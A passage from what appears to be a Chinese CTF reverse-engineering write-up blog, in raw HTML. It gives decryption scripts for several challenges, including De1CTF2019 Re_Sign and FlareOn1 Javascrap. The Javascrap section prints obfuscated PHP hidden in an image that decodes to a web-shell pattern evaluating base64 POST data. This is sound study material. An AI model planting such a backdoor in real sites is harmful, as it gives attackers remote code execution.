class="number">20</span>,keylen=<span class="number">6</span>,maxium=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> before;</span><br><span class="line"><span class="built_in">map</span>[<span class="number">0</span>]=<span class="number">2</span>;c--;</span><br><span class="line">key[<span class="number">0</span>]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">key[<span class="number">1</span>]=<span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">key[<span class="number">2</span>]=<span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">key[<span class="number">3</span>]=<span class="string">&#x27;y&#x27;</span>;</span><br><span class="line">key[<span class="number">4</span>]=<span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">key[<span class="number">5</span>]=<span class="string">&#x27;z&#x27;</span>;</span><br><span class="line">srand(time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">map</span>[i]=<span class="built_in">map</span>[i<span class="number">-1</span>]+rand()%<span class="number">5</span>;</span><br><span class="line">maxium=maxium&gt;<span class="built_in">map</span>[i]?maxium:<span class="built_in">map</span>[i];</span><br><span class="line">&#125;</span><br><span class="line">before=time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;keylen;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> step=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> t=time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">int</span> delta=t-before;</span><br><span class="line"><span class="keyword">if</span>(delta&gt;maxium)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=len;j++)</span><br><span class="line"><span class="keyword">if</span>(delta&lt;=<span class="built_in">map</span>[j])</span><br><span class="line">&#123;</span><br><span class="line">step=<span class="built_in">map</span>[j];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">key[i]=(key[i]*c+step+i*<span class="number">3</span>)%<span class="number">32</span>;</span><br><span class="line">before=t;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ks = [<span class="number">0x8c2c133a</span>, <span class="number">0xf74cb3f6</span>, <span class="number">0xfedfa6f2</span>, <span class="number">0xab293e3b</span>, <span class="number">0x26cf8a2a</span>, <span class="number">0x88a1f279</span>]</span><br><span class="line">key = [<span class="number">0x03</span>,<span class="number">0x10</span>,<span class="number">0x0d</span>,<span class="number">0x04</span>,<span class="number">0x13</span>,<span class="number">0x0b</span>]</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">bk = <span class="number">0</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    ks[i] ^= ks[i-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">4</span>):</span><br><span class="line">    k = ks[i//<span class="number">4</span>]</span><br><span class="line">    k = (<span class="number">1</span> &lt;&lt; key[i//<span class="number">4</span>]) ^ k</span><br><span class="line">    k = ((k &gt;&gt; <span class="number">16</span>)) | ((~(k &lt;&lt; <span class="number">16</span>)) &amp; <span class="number">0xffff0000</span>)</span><br><span class="line">    k = ((k &lt;&lt; key[i//<span class="number">4</span>])) | (k &gt;&gt; ((<span class="number">32</span>-key[i//<span class="number">4</span>]) &amp; <span class="number">0xff</span>))</span><br><span class="line">    k &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    flag += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(k)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>不得不说，有了源码解起来真方便，不然还得过反调， 反调还被<code>hook</code>了</p><h3 id="HellScream"><a href="#HellScream" class="headerlink" title="HellScream"></a>HellScream</h3><p><a href="https://www.kanxue.com/book-35-376.htm">4. 2016年 第19题 - 看雪 2016 CTF题解视频 - 其他内容 - 看雪-安全培训|安全招聘|www.kanxue.com</a></p><p><a href="https://bbs.pediy.com/thread-214562-1.htm">[原创]看雪2016 第十九题 CrackMe逆向分析-CTF对抗-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p><a href="https://blog.csdn.net/m0_46296905/article/details/116382650">[BUU]HellScream_m0_46296905的博客-CSDN博客</a></p><p>不看题解看不出来大数运算……..</p><h3 id="De1CTF2019-Re-Sign"><a href="#De1CTF2019-Re-Sign" class="headerlink" title="[De1CTF2019]Re_Sign"></a>[De1CTF2019]Re_Sign</h3><p>upx加壳了，不知道为什么用<code>upx</code>程序解压不了，直接<code>ESP定律</code>大法解压出来</p><p>根据字符串找到主要函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211019203613830.png" alt="image-20211019203613830"></p><p>动调发现输入<code>111</code>会变成<code>EP4f</code>, 这种<code>3</code>字符变<code>4</code>字符很像base64</p><p>在输入后，在输入处下硬件断点，动调在<code>Encrypt</code>中找到新表</p><p>接着进入<code>checkFunc</code>， 动调找到比对位置</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211019205121824.png" alt="image-20211019205121824"></p><p>通过<code>sub_402160</code>得到 编码后的字符 在原表中的位置，并跟v18[v17]对比</p><p>则解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x00000008</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000020</span>, <span class="number">0x00000007</span>, <span class="number">0x00000034</span>, <span class="number">0x00000009</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000018</span>, <span class="number">0x00000024</span>, <span class="number">0x00000013</span>, <span class="number">0x00000003</span>, <span class="number">0x00000010</span>, <span class="number">0x00000038</span>, <span class="number">0x00000009</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000008</span>, <span class="number">0x00000034</span>, <span class="number">0x00000013</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000022</span>, <span class="number">0x00000012</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000012</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000022</span>, <span class="number">0x00000012</span>, <span class="number">0x00000017</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000029</span>, <span class="number">0x00000022</span>, <span class="number">0x00000006</span>, <span class="number">0x00000024</span>, <span class="number">0x00000032</span>, <span class="number">0x00000024</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000001F</span>, <span class="number">0x0000002B</span>, <span class="number">0x00000024</span>, <span class="number">0x00000003</span>, <span class="number">0x00000015</span>]</span><br><span class="line">table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">cipher = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    cipher.append(table[i-<span class="number">1</span>])</span><br><span class="line">cipher = <span class="built_in">bytes</span>(cipher) + <span class="string">b&quot;==&quot;</span></span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">new_table = <span class="string">b&quot;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=&quot;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = cipher.translate(<span class="built_in">bytes</span>.maketrans(new_table, table))</span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="FlareOn1-Javascrap"><a href="#FlareOn1-Javascrap" class="headerlink" title="[FlareOn1]Javascrap"></a>[FlareOn1]Javascrap</h3><p>打开html, 可以看到</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211029205523970.png" alt="image-20211029205523970"></p><p>用010Editor查看图片，在文件末尾看到php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$terms</span> = <span class="keyword">array</span>(<span class="string">&quot;M&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;|&quot;</span>);</span><br><span class="line"><span class="variable">$order</span> = <span class="keyword">array</span>(<span class="number">59</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">81</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">28</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">76</span>, <span class="number">68</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">45</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">63</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">23</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">49</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">66</span>, <span class="number">3</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">88</span>, <span class="number">77</span>, <span class="number">80</span>, <span class="number">38</span>, <span class="number">25</span>, <span class="number">40</span>, <span class="number">81</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">76</span>, <span class="number">81</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">28</span>, <span class="number">7</span>, <span class="number">88</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">90</span>, <span class="number">52</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">66</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">70</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">91</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">70</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">75</span>, <span class="number">11</span>, <span class="number">79</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">42</span>, <span class="number">23</span>, <span class="number">88</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">35</span>, <span class="number">68</span>, <span class="number">38</span>, <span class="number">63</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">30</span>, <span class="number">81</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">28</span>, <span class="number">23</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">1</span>, <span class="number">43</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">40</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">70</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">4</span>, <span class="number">51</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">70</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">21</span>, <span class="number">47</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">58</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">29</span>, <span class="number">29</span>, <span class="number">47</span>);</span><br><span class="line"><span class="variable">$do_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; count(<span class="variable">$order</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$do_me</span> = <span class="variable">$do_me</span> . <span class="variable">$terms</span>[<span class="variable">$order</span>[<span class="variable">$i</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$do_me</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>eval</code>改为<code>echo</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211029210012101.png" alt="image-20211029210012101"></p><p>找个在线工具打印一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=\<span class="string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&#x27;;</span></span><br><span class="line"><span class="string">$__=\&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&#x27;;</span></span><br><span class="line"><span class="string">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;</span></span><br><span class="line"><span class="string">eval($___($__));</span></span><br></pre></td></tr></table></figure><p>其中<code>$___</code>和<code>$__</code>为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">➜  Desktop bpython3</span><br><span class="line">bpython version <span class="number">0.17</span><span class="number">.1</span> on top of Python <span class="number">3.6</span><span class="number">.9</span> /usr/<span class="built_in">bin</span>/python3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">b&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">b&#x27;base64_decode&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;$code=base64_decode($_);eval($code);&#x27;</span></span><br></pre></td></tr></table></figure><p>则<code>base64_decode($_)</code>得</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span 